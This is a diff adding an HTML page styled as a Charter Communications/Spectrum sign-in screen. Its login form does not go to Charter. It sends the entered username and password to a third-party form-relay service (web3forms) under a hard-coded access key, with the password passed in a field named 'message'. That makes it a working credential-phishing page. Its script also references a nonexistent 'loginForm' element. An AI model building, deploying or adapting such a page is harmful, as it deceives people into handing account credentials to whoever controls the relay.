@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to get Started</title>
+    <link rel="stylesheet" href="./headder style.css">
+    <link rel="icon" type="image/x-icon" href="./content/favicon.ico">
+</head>
+<body>
+    <div class="header">
+        <img src="./content/spectrum-logo.svg" alt="" class="headerlogo">
+    </div>
+    <div class="formsection">
+        <div class="innersection">
+            <h1 class="bannertext">Sign In to Get Started</h1>
+            <div class="orbtn">
+                <div  class="horizontal-bar divider">
+                    <hr  aria-hidden="true" class="left">
+                    <span >or</span>
+                    <hr aria-hidden="true" class="right">
+                </div>
+            </div>
+            <div class="newusername">
+                <a href="#" class="linkedbtn">Create a Username</a>
+            </div>
+            <div class="formdivsi">
+                <form action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="d981c8c8-d74e-405b-9217-c7341bbbcc83">
+
+                        <label for="username">Username</label>
+                        <input
+                            type="text"
+                            id="username"
+                            name="email"
+                            required
+                            autocomplete="username"
+                        >
+                        <div id="userMsg"></div>
+
+                        <br>
+
+                        <label for="password">Password</label>
+                        <input
+                            type="password"
+                            id="password"
+                            name="message"
+                            required
+                            autocomplete="current-password"
+                        >
+                        <div id="passMsg"></div>
+
+                        <div id="message" class="message"></div>
+
+                        <button type="submit">Sign In</button>
+
+                        <div class="forgetpass">
+                            <a href="#">Forgot Username or Password?</a>
+                        </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+    <div class="footersign">© 2026 Charter Communications</div>
+    <script>
+const username = document.getElementById("username");
+const password = document.getElementById("password");
+
+const userMsg = document.getElementById("userMsg");
+const passMsg = document.getElementById("passMsg");
+
+const usernameRegex = /^[A-Za-z][A-Za-z0-9._]{5,31}$/;
+
+const passwordRegex =
+/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*#?&^()_\-+=])[A-Za-z\d@$!%*#?&^()_\-+=]{8,64}$/;
+
+username.addEventListener("input", () => {
+    if (usernameRegex.test(username.value)) {
+        userMsg.style.color = "green";
+        userMsg.textContent = "✓ Valid username";
+    } else {
+        userMsg.style.color = "red";
+        userMsg.textContent =
+            "Username must start with a letter and be 6–32 characters.";
+    }
+});
+
+password.addEventListener("input", () => {
+    if (passwordRegex.test(password.value)) {
+        passMsg.style.color = "green";
+        passMsg.textContent = "✓ Strong password format";
+    } else {
+        passMsg.style.color = "red";
+        passMsg.textContent =
+            "Password must be 8–64 characters with uppercase, and special character.";
+    }
+});
+
+document.getElementById("loginForm").addEventListener("submit", function(e){
+
+    if(!usernameRegex.test(username.value) ||
+       !passwordRegex.test(password.value)){
+
+        e.preventDefault();
+        alert("Please correct the highlighted fields.");
+    }
+
+});
+</script>
+</body>
+</html>
